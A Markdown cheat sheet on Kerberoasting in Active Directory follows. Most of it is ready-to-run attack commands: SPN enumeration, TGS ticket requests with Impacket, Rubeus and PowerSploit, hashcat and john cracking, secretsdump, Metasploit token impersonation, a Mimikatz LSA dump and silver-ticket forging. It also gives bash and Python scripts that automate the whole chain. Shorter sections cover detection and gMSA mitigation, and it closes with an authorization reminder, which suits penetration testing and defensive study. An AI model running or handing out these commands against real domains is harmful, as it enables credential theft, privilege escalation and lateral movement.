# Kerberoasting

## Overview
Kerberoasting is an attack technique that targets service accounts in Active Directory environments. The goal is to request Ticket Granting Service (TGS) tickets for service accounts with Service Principal Names (SPNs) and then crack the encrypted portion offline to obtain the service account password.

## What is Kerberoasting?

### Key Concepts
- **Service Principal Names (SPNs)**: Unique identifiers for services running on servers
- **TGS (Ticket Granting Service)**: Part of Kerberos that issues service tickets
- **Service Accounts**: Accounts used to run services, often with elevated privileges
- **Offline Cracking**: Attacking the encrypted ticket without network interaction

### Attack Flow
1. **Request TGS ticket** for service account with SPN
2. **Extract encrypted portion** of the ticket (encrypted with service account password)
3. **Crack the hash offline** using tools like Hashcat or John the Ripper
4. **Obtain plaintext password** for lateral movement or privilege escalation

### Why Kerberoasting Works
- Any authenticated domain user can request TGS tickets for any SPN
- Service accounts often have weak passwords
- Service accounts frequently have elevated privileges
- Cracking happens offline, avoiding detection

## Kerberos Authentication Flow

### Normal Kerberos Process
```bash
# 1. User requests TGT from KDC (Key Distribution Center)
# 2. KDC returns TGT encrypted with krbtgt hash
# 3. User presents TGT and requests TGS for service
# 4. KDC returns TGS encrypted with service account password
# 5. User presents TGS to service for authentication
# 6. Service validates TGS and grants access
```

### Kerberoasting Exploitation
```bash
# 1. Attacker requests TGS for service (steps 1-4 above)
# 2. Attacker extracts encrypted TGS ticket
# 3. Attacker performs offline brute force attack
# 4. If successful, attacker obtains service account password
```

## Discovery and Enumeration

### Finding SPNs with PowerShell
```powershell
# Find all SPNs in domain
setspn -T domain.local -Q */*

# Find SPNs for specific service types
setspn -T domain.local -Q MSSQLSvc/*
setspn -T domain.local -Q HTTP/*
setspn -T domain.local -Q HOST/*

# Using PowerShell Active Directory module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### LDAP Enumeration
```bash
# Using ldapsearch to find SPNs
ldapsearch -x -H ldap://dc.domain.local -D "user@domain.local" -w password -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" servicePrincipalName sAMAccountName

# Find specific service types
ldapsearch -x -H ldap://dc.domain.local -D "user@domain.local" -w password -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=MSSQLSvc/*))" servicePrincipalName sAMAccountName
```

### BloodHound Enumeration
```bash
# BloodHound queries for Kerberoastable users
# Pre-built query: "Find all Kerberoastable Users"
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

# Find Kerberoastable users with admin rights
MATCH (u:User {hasspn:true})-[:AdminTo]->(c:Computer) RETURN u.name, c.name

# Find high-value Kerberoastable targets
MATCH (u:User {hasspn:true, highvalue:true}) RETURN u.name
```

## Attack Tools and Techniques

### GetUserSPNs.py (Impacket)
```bash
# Basic SPN enumeration
GetUserSPNs.py domain.local/username:password -dc-ip dc_ip

# Request TGS tickets and save to file
GetUserSPNs.py domain.local/username:password -dc-ip dc_ip -request

# Save tickets in different formats
GetUserSPNs.py domain.local/username:password -dc-ip dc_ip -request -outputfile kerberoast_hashes.txt

# Use NTLM hash for authentication
GetUserSPNs.py -hashes :ntlm_hash domain.local/username -dc-ip dc_ip -request

# Target specific SPN
GetUserSPNs.py domain.local/username:password -dc-ip dc_ip -request-user target_service_account
```

### Rubeus (Windows)
```bash
# Enumerate SPNs
Rubeus.exe kerberoast

# Request specific user
Rubeus.exe kerberoast /user:serviceaccount

# Save output to file
Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

# Use specific encryption type
Rubeus.exe kerberoast /enctype:aes256

# Roast all users
Rubeus.exe kerberoast /stats
```

### PowerShell Empire/PowerSploit
```powershell
# Invoke-Kerberoast from PowerSploit
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat

# Request specific user
Invoke-Kerberoast -Identity serviceaccount -OutputFormat Hashcat

# Export to file
Invoke-Kerberoast -OutputFormat Hashcat | Out-File kerberoast.txt
```

### CrackMapExec Integration
```bash
# Enumerate SPNs with CME
crackmapexec ldap domain.local -u username -p password --kerberoasting kerberoast_output.txt

# Use with hash
crackmapexec ldap domain.local -u username -H ntlm_hash --kerberoasting kerberoast_output.txt
```

## Hash Cracking

### Hash Formats
```bash
# Hashcat format (mode 13100 for TGS-REP)
$krb5tgs$23$*serviceaccount$DOMAIN.LOCAL$domain.local/serviceaccount*$hash...

# John the Ripper format
$krb5tgs$serviceaccount$DOMAIN.LOCAL$*domain.local/serviceaccount*$hash...
```

### Hashcat Cracking
```bash
# Basic cracking with rockyou.txt
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# Use rules for better results
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack for common patterns
hashcat -m 13100 kerberoast_hashes.txt -a 3 ?u?l?l?l?l?l?l?d?d

# Combination attack
hashcat -m 13100 kerberoast_hashes.txt -a 1 wordlist1.txt wordlist2.txt

# Show cracked passwords
hashcat -m 13100 kerberoast_hashes.txt --show
```

### John the Ripper
```bash
# Basic cracking
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt

# Use rules
john --wordlist=/usr/share/wordlists/rockyou.txt --rules kerberoast_hashes.txt

# Show cracked passwords
john --show kerberoast_hashes.txt
```

### Custom Wordlists
```bash
# Create service-specific wordlists
# Common service account patterns:
# - ServiceName + Year (e.g., SQLService2024)
# - CompanyName + Service (e.g., AcmeSQLSvc)
# - Service + Numbers (e.g., WebService123)

# Generate custom wordlist
crunch 8 12 -t Service@@@ > service_passwords.txt
crunch 8 12 -t @@@@2024 > year_passwords.txt
```

## Post-Exploitation

### Using Cracked Credentials
```bash
# Test cracked password across domain
crackmapexec smb domain.local -u serviceaccount -p crackedpassword

# Check what services the account can access
crackmapexec smb domain.local -u serviceaccount -p crackedpassword --shares

# Execute commands if admin rights
crackmapexec smb domain.local -u serviceaccount -p crackedpassword -x whoami

# Dump credentials if possible
secretsdump.py domain.local/serviceaccount:crackedpassword@target_ip
```

### Lateral Movement
```bash
# Use service account for further enumeration
bloodhound-python -d domain.local -u serviceaccount -p crackedpassword -gc dc.domain.local -c all

# Check for delegation rights
Get-ADUser serviceaccount -Properties TrustedForDelegation,TrustedToAuthForDelegation

# Look for additional SPNs
setspn -L serviceaccount
```

### Token Impersonation

#### Overview
Token impersonation is a post-exploitation technique that allows attackers to impersonate other users by stealing and using their access tokens. This is particularly effective after successful Kerberoasting when you have service account credentials.

#### What are Tokens?
- **Definition**: Temporary keys that allow access to a system/network without providing credentials each time
- **Function**: Think of them as "cookies for computers"
- **Purpose**: Enable seamless access to resources without repeated authentication

#### Token Types

##### Delegate Tokens
- **Purpose**: Created for logging into a machine or using Remote Desktop
- **Characteristics**: 
  - Interactive logon sessions
  - Full user privileges
  - Can be used for network authentication
  - Higher privilege level

##### Impersonate Tokens  
- **Purpose**: "Non-interactive" operations
- **Use Cases**:
  - Attaching network drives
  - Domain logon scripts
  - Automated services
- **Characteristics**:
  - Limited functionality
  - Cannot be used for interactive logons
  - Lower privilege level

#### Token Impersonation Techniques

##### Using Incognito (Metasploit)
```bash
# Load incognito module in meterpreter
load incognito

# List available tokens
list_tokens -u

# Impersonate specific user token
impersonate_token domain\\username

# Revert to original token
rev2self
```

##### Using Invoke-TokenManipulation (PowerShell)
```powershell
# Import the module
Import-Module .\Invoke-TokenManipulation.ps1

# List available tokens
Invoke-TokenManipulation -ShowAll

# Impersonate specific user
Invoke-TokenManipulation -ImpersonateUser -Username "domain\serviceaccount"

# Create process with impersonated token
Invoke-TokenManipulation -ImpersonateUser -Username "domain\admin" -CreateProcess "cmd.exe"
```

##### Manual Token Manipulation
```bash
# Using PsExec with service account credentials (after Kerberoasting)
psexec.py domain.local/serviceaccount:crackedpassword@target_ip

# Once on system, look for high-privilege tokens
whoami /priv

# Check for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
# These privileges allow token impersonation
```

#### Token Impersonation After Kerberoasting

##### Scenario: Service Account to Domain Admin
```bash
# 1. Successfully cracked service account from Kerberoasting
# serviceaccount:ServicePass123!

# 2. Use service account to access systems
crackmapexec smb domain.local -u serviceaccount -p ServicePass123!

# 3. Get shell on system where service account has access
psexec.py domain.local/serviceaccount:ServicePass123!@web-server.domain.local

# 4. Look for administrator tokens on the system
# In meterpreter:
load incognito
list_tokens -u

# 5. If administrator token is available:
impersonate_token domain\\administrator

# 6. Now operating as domain administrator
whoami
# Result: domain\administrator
```

##### Post-Impersonation Actions and Limitations
```bash
# After successful token impersonation as marvel\fcastle
C:\Windows\system32> whoami
marvel\fcastle

# Attempt to dump LSA hashes with Mimikatz
PS C:\> Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /inject" exit' -Computer HYDRA.marvel.local

# Result: Access Denied Error
[HYDRA.marvel.local] Connecting to remote server HYDRA.marvel.local failed with the following error message: 
Access is denied. For more information, see the about Remote Troubleshooting Help topic.
+ CategoryInfo: OpenError: (HYDRA.marvel.local:String) [], PSRemotingTransportException
+ FullyQualifiedErrorId: AccessDenied,PSSessionStateBroken

# Analysis: 
# - Token impersonation successful
# - User fcastle lacks administrative privileges 
# - Cannot dump LSA hashes
# - Need further privilege escalation
```

##### Understanding Token Impersonation Limitations
```bash
# Common limitations after token impersonation:
# 1. User token may not have admin rights
# 2. Cannot access protected resources (like LSA)
# 3. May not have SeDebugPrivilege
# 4. Limited to user's actual domain permissions

# Check current privileges after impersonation
whoami /priv
# Look for critical privileges:
# - SeDebugPrivilege (needed for memory access)
# - SeImpersonatePrivilege (allows further token manipulation)
# - SeLoadDriverPrivilege (driver loading)
# - SeTcbPrivilege (trusted computer base)

# Check group memberships
whoami /groups
# Look for admin groups:
# - Domain Admins
# - Enterprise Admins  
# - Local Administrators
# - Backup Operators
```

##### Next Steps After Token Impersonation
```bash
# If access denied for high-privilege operations:

# 1. Enumerate user permissions more thoroughly
net user fcastle /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# 2. Look for other escalation paths
# - Check for other high-privilege tokens
# - Look for vulnerable services
# - Search for credentials in files/registry

# 3. Attempt lateral movement to find admin tokens
# Use current token to access other systems
dir \\server1.marvel.local\c$
dir \\server2.marvel.local\c$

# 4. Try alternative credential dumping methods
# If LSA dump fails, try other approaches:
# - SAM database dump
# - Registry credential extraction
# - Process memory dumping
```

## Advanced Techniques

### Targeted Kerberoasting
```bash
# Focus on high-value targets
# - SQL Server service accounts
# - Exchange service accounts
# - SharePoint service accounts
# - Custom application service accounts

# Target specific encryption types
GetUserSPNs.py domain.local/username:password -dc-ip dc_ip -request -target-domain domain.local
```

### ASREPRoasting Integration
```bash
# Combine with ASREPRoasting for comprehensive attack
GetNPUsers.py domain.local/username:password -dc-ip dc_ip -request

# Look for users with "Do not require Kerberos preauthentication"
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

### Golden/Silver Ticket Preparation
```bash
# Use service account hash for silver tickets
# Extract service account NTLM hash from cracked password
python3 -c "import hashlib; print(hashlib.new('md4', 'crackedpassword'.encode('utf-16le')).hexdigest())"

# Create silver ticket with mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:domain_sid /target:server.domain.local /service:cifs /rc4:service_account_hash /ptt
```

## Defense and Detection

### Preventive Measures
```bash
# Strong service account passwords
# - Minimum 25+ character passwords
# - Use managed service accounts (MSA/gMSA)
# - Regular password rotation

# Group Managed Service Accounts (gMSA)
New-ADServiceAccount -Name gMSA-WebService -DNSHostName web.domain.local -PrincipalsAllowedToRetrieveManagedPassword "WebServers$"

# Managed Service Accounts (MSA)
New-ADServiceAccount -Name MSA-SQLService -RestrictToSingleComputer
```

### Detection Strategies
```bash
# Monitor for unusual TGS requests
# Event ID 4769 - Kerberos service ticket requested
# Look for:
# - Multiple TGS requests from single user
# - Requests for service accounts with weak passwords
# - Unusual encryption types (RC4 vs AES)

# PowerShell detection script
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} | 
Where-Object {$_.Message -match "RC4-HMAC"} |
Group-Object -Property {$_.Properties[0].Value} |
Where-Object {$_.Count -gt 10}
```

### Honeypot Service Accounts
```bash
# Create fake service accounts with monitoring
# Set attractive SPNs that don't correspond to real services
# Monitor for any authentication attempts

# Create honeypot SPN
setspn -A HTTP/fake-web-server.domain.local honeypot-account

# Monitor honeypot account usage
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} |
Where-Object {$_.Properties[0].Value -eq "honeypot-account"}
```

## Practical Attack Scenarios

### Scenario 1: SQL Server Service Account
```bash
# 1. Discover SQL service account
GetUserSPNs.py domain.local/user:pass -dc-ip dc_ip | grep -i sql

# 2. Request TGS ticket
GetUserSPNs.py domain.local/user:pass -dc-ip dc_ip -request-user sqlservice

# 3. Crack the hash
hashcat -m 13100 sqlservice_hash.txt rockyou.txt

# 4. Result: sqlservice:SQLPass123!
# 5. Test access to SQL servers
crackmapexec mssql domain.local -u sqlservice -p SQLPass123!
```

### Scenario 2: Web Application Service Account
```bash
# 1. Find web service SPNs
setspn -T domain.local -Q HTTP/*

# 2. Request tickets for all HTTP SPNs
GetUserSPNs.py domain.local/user:pass -dc-ip dc_ip -request

# 3. Focus on crackable hashes (weak passwords)
hashcat -m 13100 all_hashes.txt common_passwords.txt

# 4. Found: webservice:WebApp2023
# 5. Check for admin rights on web servers
crackmapexec smb domain.local -u webservice -p WebApp2023
```

### Scenario 3: Exchange Service Account
```bash
# 1. Target Exchange-related SPNs
GetUserSPNs.py domain.local/user:pass -dc-ip dc_ip | grep -i exchange

# 2. Request Exchange service tickets
GetUserSPNs.py domain.local/user:pass -dc-ip dc_ip -request-user exchangeservice

# 3. Crack with Exchange-specific wordlist
hashcat -m 13100 exchange_hash.txt exchange_passwords.txt

# 4. Result: exchangeservice:ExchangeAdmin2024!
# 5. Access Exchange servers and mailboxes
```

## Automation and Scripting

### Automated Kerberoasting Script
```bash
#!/bin/bash
# Automated Kerberoasting script

DOMAIN="domain.local"
USERNAME="user"
PASSWORD="password"
DC_IP="192.168.1.10"

echo "[+] Starting Kerberoasting attack"

# 1. Enumerate SPNs
echo "[+] Enumerating SPNs..."
GetUserSPNs.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP > spn_enum.txt

# 2. Request TGS tickets
echo "[+] Requesting TGS tickets..."
GetUserSPNs.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP -request -outputfile kerberoast_hashes.txt

# 3. Start cracking
echo "[+] Starting hash cracking..."
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force

# 4. Check results
echo "[+] Checking cracked passwords..."
hashcat -m 13100 kerberoast_hashes.txt --show
```

### Python Integration
```python
#!/usr/bin/env python3
import subprocess
import re
import time

def run_kerberoast(domain, username, password, dc_ip):
    """Run GetUserSPNs and return results"""
    cmd = f"GetUserSPNs.py {domain}/{username}:{password} -dc-ip {dc_ip} -request"
    result = subprocess.run(cmd.split(), capture_output=True, text=True)
    return result.stdout

def extract_hashes(output):
    """Extract hashes from GetUserSPNs output"""
    hash_pattern = r'\$krb5tgs\$23\$.*'
    hashes = re.findall(hash_pattern, output)
    return hashes

def crack_hashes(hash_file, wordlist):
    """Attempt to crack hashes with hashcat"""
    cmd = f"hashcat -m 13100 {hash_file} {wordlist} --force --quiet"
    subprocess.run(cmd.split())

# Usage
domain = "domain.local"
username = "user"
password = "password"
dc_ip = "192.168.1.10"

print("[+] Running Kerberoasting attack")
output = run_kerberoast(domain, username, password, dc_ip)
hashes = extract_hashes(output)

if hashes:
    print(f"[+] Found {len(hashes)} Kerberoastable hashes")
    with open("kerberoast_hashes.txt", "w") as f:
        for hash_val in hashes:
            f.write(hash_val + "\n")
    
    print("[+] Starting cracking process")
    crack_hashes("kerberoast_hashes.txt", "/usr/share/wordlists/rockyou.txt")
else:
    print("[-] No Kerberoastable hashes found")
```

## Mitigation Best Practices

### Service Account Security
```bash
# Use Group Managed Service Accounts (gMSA)
# Benefits:
# - Automatic password management
# - 120+ character passwords
# - Regular automatic rotation
# - No manual password management

# Implementation:
New-ADServiceAccount -Name gMSA-WebApp -DNSHostName webapp.domain.local -PrincipalsAllowedToRetrieveManagedPassword "WebServers$"
Install-ADServiceAccount -Identity gMSA-WebApp
```

### Monitoring Implementation
```bash
# Implement comprehensive logging
# Monitor Event ID 4769 for unusual patterns
# Set up alerts for:
# - Multiple TGS requests from single user
# - Requests for sensitive service accounts
# - RC4 encryption usage (prefer AES)

# Example monitoring query
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769; StartTime=(Get-Date).AddHours(-1)} |
Where-Object {$_.Properties[3].Value -eq "0x17"} |  # RC4 encryption
Group-Object -Property {$_.Properties[0].Value} |
Where-Object {$_.Count -gt 5}
```

### Network Segmentation
```bash
# Isolate service accounts
# Limit service account access to necessary systems only
# Implement just-in-time access for service accounts
# Use network segmentation to limit lateral movement
```

---

**Note**: Always ensure proper authorization before conducting Kerberoasting attacks. These techniques should only be used in authorized penetration testing scenarios or controlled lab environments. 